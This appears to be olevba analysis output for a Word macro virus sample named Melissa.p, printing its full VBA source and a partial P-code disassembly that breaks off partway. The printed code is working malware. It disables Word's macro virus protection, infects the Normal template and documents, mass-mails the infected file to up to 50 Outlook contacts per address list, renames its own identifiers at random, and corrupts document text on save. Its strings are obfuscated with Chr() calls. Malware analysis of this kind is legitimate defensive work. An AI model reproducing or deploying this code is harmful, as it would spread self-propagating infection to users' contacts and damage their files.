olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.p
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa.p - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
On Error Resume Next
Options.ConfirmConversions = 0
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
K44 = Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101)
If System.ProfileString("", K44) = Empty Then System.ProfileString("", K44) = Str(0)
If ActiveDocument.Words.Count <= 5 Then Exit Sub
With ActiveDocument.VBProject.VBComponents
H865 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set D778 = .Item(1)
F421 = True
System.ProfileString("", K44) = Str(Val(System.ProfileString("", K44)) + 1)
End If
End With
With NormalTemplate.VBProject.VBComponents
K766 = .Item(1).CodeModule.CountOfLines
If Left(.Item(1).CodeModule.Lines(1, 3), 3) <> "Sub" Then
Set D778 = .Item(1)
C625 = True
System.ProfileString("", K44) = Str(Val(System.ProfileString("", K44)) + 1)
Call P103_D186
End If
End With
If C625 <> True And F421 <> True Then GoTo R445
If C625 = True Then D778.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(67) + Chr(108) + Chr(111) + Chr(115) + Chr(101) + Chr(40) + Chr(41) & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, H865 - 1))
If F421 = True Then D778.CodeModule.AddFromString (Chr(83) + Chr(117) + Chr(98) + Chr(32) + Chr(65) + Chr(117) + Chr(116) + Chr(111) + Chr(79) + Chr(112) + Chr(101) + Chr(110) + Chr(40) + Chr(41) & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, K766 - 1))
R445:
If Val(System.ProfileString("", K44)) = 5 Then
Dim R39, Q43, B864, N842, F120
Set R39 = CreateObject(Chr(79) + Chr(117) + Chr(116) + Chr(108) + Chr(111) + Chr(111) + Chr(107) + Chr(46) + Chr(65) + Chr(112) + Chr(112) + Chr(108) + Chr(105) + Chr(99) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110))
Set Q43 = R39.GetNameSpace("MAPI")
If R39 = "Outlook" Then
    With ActiveDocument
    If .Saved = False Then
        .Save
        If .Saved = False Then Exit Sub
    End If
    End With
    Q43.Logon Chr(112) + Chr(114) + Chr(111) + Chr(102) + Chr(105) + Chr(108) + Chr(101), Chr(112) + Chr(97) + Chr(115) + Chr(115) + Chr(119) + Chr(111) + Chr(114) + Chr(100)
    For Y = 1 To Q43.AddressLists.Count
        Set V422 = Q43.AddressLists(Y)
        x = 1
        Set B864 = R39.CreateItem(0)
        For oo = 1 To V422.AddressEntries.Count
            N842 = V422.AddressEntries(x)
            B864.Recipients.Add N842
            x = x + 1
            If x > 50 Then oo = V422.AddressEntries.Count
         Next oo
         B864.Subject = Chr(77) + Chr(101) + Chr(115) + Chr(115) + Chr(97) + Chr(103) + Chr(101) + Chr(32) + Chr(70) + Chr(114) + Chr(111) + Chr(109) + Chr(32) & Application.UserName
         B864.Body = Chr(72) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(116) + Chr(104) + Chr(97) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(99) + Chr(117) + Chr(109) + Chr(101) + Chr(110) + Chr(116) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(97) + Chr(115) + Chr(107) + Chr(101) + Chr(100) + Chr(32) + Chr(102) + Chr(111) + Chr(114) + Chr(46) + Chr(32) + Chr(32) + Chr(72) + Chr(111) + Chr(112) + Chr(101) + Chr(32) + Chr(121) + Chr(111) + Chr(117) + Chr(32) + Chr(101) + Chr(110) + Chr(106) + Chr(111) + Chr(121) + Chr(32) + Chr(105) + Chr(116) + Chr(32) + Chr(59) + Chr(45) + Chr(41)
         B864.Attachments.Add ActiveDocument.FullName
         B864.Send
         N842 = ""
         Next Y
    Q43.Logoff
    R39.Application.Quit
    R39 = Nothing
  End If
End If
If K766 <> 0 And H865 = 0 Then
    If ActiveDocument.Saved = False Then
        ActiveDocument.Save
    End If
End If
End Sub

'Sub ToolsMacro()
'Q183
'End Sub

'Sub ViewVBCode()
'Q183
'End Sub

'Sub FileTemplates()
'Q183
'End Sub

Private Sub Q183()
msg = Chr(84) + Chr(104) + Chr(105) + Chr(115) + Chr(32) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(32) + Chr(104) + Chr(97) + Chr(115) + Chr(32) + Chr(112) + Chr(101) + Chr(114) + Chr(102) + Chr(111) + Chr(114) + Chr(109) + Chr(101) + Chr(100) + Chr(32) + Chr(97) + Chr(110) + Chr(32) + Chr(105) + Chr(108) + Chr(108) + Chr(101) + Chr(103) + Chr(97) + Chr(108) + Chr(32) + Chr(111) + Chr(112) + Chr(101) + Chr(114) + Chr(97) + Chr(116) + Chr(105) + Chr(111) + Chr(110) + Chr(32) + Chr(97) + Chr(110) + Chr(100) + Chr(32) + Chr(119) + Chr(105) + Chr(108) + Chr(108) + Chr(32) + Chr(115) + Chr(104) + Chr(117) + Chr(116) + Chr(32) + Chr(100) + Chr(111) + Chr(119) + Chr(110) + Chr(46)
MsgBox msg, vbCritical, Chr(77) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(111) + Chr(102) + Chr(116) + Chr(32) + Chr(87) + Chr(111) + Chr(114) + Chr(100)
End Sub

Private Sub P103_D186()
On Error Resume Next
Randomize Timer
Dim M457(0 To 24) As String
M457(0) = "M457"
M457(1) = "C731": M457(2) = "R879": M457(3) = "A828": M457(4) = "J447": M457(5) = "D186": M457(6) = "H865"
M457(7) = "K766": M457(8) = "F421":: M457(9) = "D778": M457(10) = "C625": M457(11) = "R445": M457(12) = "P103": M457(13) = "L17": M457(14) = "V733"
M457(15) = "R39": M457(16) = "Q43": M457(17) = "B864": M457(18) = "N842": M457(19) = "V422": M457(20) = "F120": M457(21) = "N233": M457(22) = "Q183"
M457(23) = "D673": M457(24) = "K44"
For x = 0 To 24
a1 = (Chr(65 + Int(Rnd * 22))) & Int(Rnd * 1000)
Call D186(a1, M457(x))
Next x
End Sub

Private Sub D186(V733, L17 As String)
On Error Resume Next
Dim C731 As Long: Dim R879 As Long: Dim A828 As Long: Dim J447 As Long
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
C731 = 1: R879 = 1: A828 = .CountOfLines: J447 = Len(.Lines(.CountOfLines, 1))
Do While .Find(L17, C731, R879, A828, J447, True)
strline = .Lines(C731, 1)
strline = Left(strline, R879 - 1) & V733 & Mid(strline, J447)
.ReplaceLine C731, strline
C731 = A828 + 1: R879 = 1: DD2134 = .CountOfLines
J447 = Len(.Lines(.CountOfLines, 1))
Loop
End With
End Sub

Sub FileSave()
On Error Resume Next
ActiveDocument.Save
If ActiveDocument.Words.Count <= 5 And Day(Now()) <> 13 Then Exit Sub
Set N233 = ActiveDocument.Content
With N233.Find
    .ClearFormatting
    .Replacement.ClearFormatting
    .MatchWholeWord = True
    .Execute FindText:=".", ReplaceWith:=",", Replace:=wdReplaceAll
    .Execute FindText:="a", ReplaceWith:="e", Replace:=wdReplaceAll
    .Execute FindText:="and", ReplaceWith:="not", Replace:=wdReplaceAll
End With
msg = vbCrLf + Chr(89) + Chr(111) + Chr(117) + Chr(39) + Chr(118) + Chr(101) + Chr(32) + Chr(98) + Chr(101) + Chr(101) + Chr(110) + Chr(32) + Chr(69) + Chr(99) + Chr(108) + Chr(105) + Chr(112) + Chr(115) + Chr(101) + Chr(100) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(77) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(33) + Chr(77) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(77) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(36) + Chr(77) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33)
msg = msg + vbCrLf + Chr(32) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(33) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126)
msg = msg + vbCrLf + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(126) + Chr(32) + Chr(32) + Chr(32) + Chr(126) + Chr(126)
Set myR = ActiveDocument.Range(ActiveDocument.Content.End - 1, ActiveDocument.Content.End)
myR.InsertAfter msg
myR.Font.Name = "Courier New"
ActiveDocument.Save
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Melissa.p
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 43341 bytes
' Line #0:
' 	FuncDefn (Sub AutoClose())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #3:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	LitDI2 0x0000 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #5:
' 	LitDI2 0x0045 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St H865 
' Line #6:
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	LitVarSpecial (Empty)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0000 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' 	EndIf 
' Line #7:
' 	Ld ActiveDocument 
' 	MemLd Words 
' 	MemLd Count 
' 	LitDI2 0x0005 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #8:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #9:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St D778 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #11:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	Set F421 
' Line #12:
' 	LitVarSpecial (True)
' 	St K766 
' Line #13:
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	EndWith 
' Line #16:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	With 
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St C625 
' Line #18:
' 	LitDI2 0x0001 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Sub"
' 	Ne 
' 	IfBlock 
' Line #19:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	ArgsMemLdWith Item 0x0001 
' 	Set F421 
' Line #20:
' 	LitVarSpecial (True)
' 	St R445 
' Line #21:
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemSt ProfileString 0x0002 
' Line #22:
' 	ArgsCall (Call) Q183 0x0000 
' Line #23:
' 	EndIfBlock 
' Line #24:
' 	EndWith 
' Line #25:
' 	Ld R445 
' 	LitVarSpecial (True)
' 	Ne 
' 	Ld K766 
' 	LitVarSpecial (True)
' 	Ne 
' 	And 
' 	If 
' 	BoSImplicit 
' 	GoTo R39 
' 	EndIf 
' Line #26:
' 	Ld R445 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0043 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld D778 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld F421 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #27:
' 	Ld K766 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0053 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0062 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0020 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0028 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0029 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld vbCr 
' 	Concat 
' 	LitDI2 0x0002 
' 	Ld C625 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	Paren 
' 	Ld F421 
' 	MemLd CodeModule 
' 	ArgsMemCall AddFromString 0x0001 
' 	EndIf 
' Line #28:
' 	Label R39 
' Line #29:
' 	LitStr 0x0000 ""
' 	Ld H865 
' 	Ld System 
' 	ArgsMemLd ProfileString 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #30:
' 	Dim 
' 	VarDefn Q43
' 	VarDefn B864
' 	VarDefn N842
' 	VarDefn F120
' 	VarDefn V422
' Line #31:
' 	SetStmt 
' 	LitDI2 0x004F 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0075 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006B 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x002E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0041 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0063 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0074 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006E 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	ArgsLd CreateObject 0x0001 
' 	Set Q43 
' Line #32:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld Q43 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set B864 
' Line #33:
' 	Ld Q43 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #34:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	With 
' Line #35:
' 	MemLdWith Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	ArgsMemCallWith Save 0x0000 
' Line #37:
' 	MemLdWith Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ExitSub 
' 	EndIf 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndWith 
' Line #40:
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0066 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0069 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006C 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0065 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0070 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0061 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0073 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0077 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x006F 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0072 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x0064 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	Ld B864 
' 	ArgsMemCall Logon 0x0002 
' Line #41:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld B864 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #42:
' 	SetStmt 
' 	Ld Y 
' 	Ld B864 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set M457 
' Line #43:
' 	LitDI2 0x0001 
' 	St x 
' Line #44:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld Q43 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set N842 
' Line #45:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld M457 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #46:
' 	Ld x 
' 	Ld M457 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St F120 
' Line #47:
' 	Ld F120 
' 	Ld N842 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #48:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #49:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld M457 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #50:
' 	StartForVariable 
' 	Ld oo 
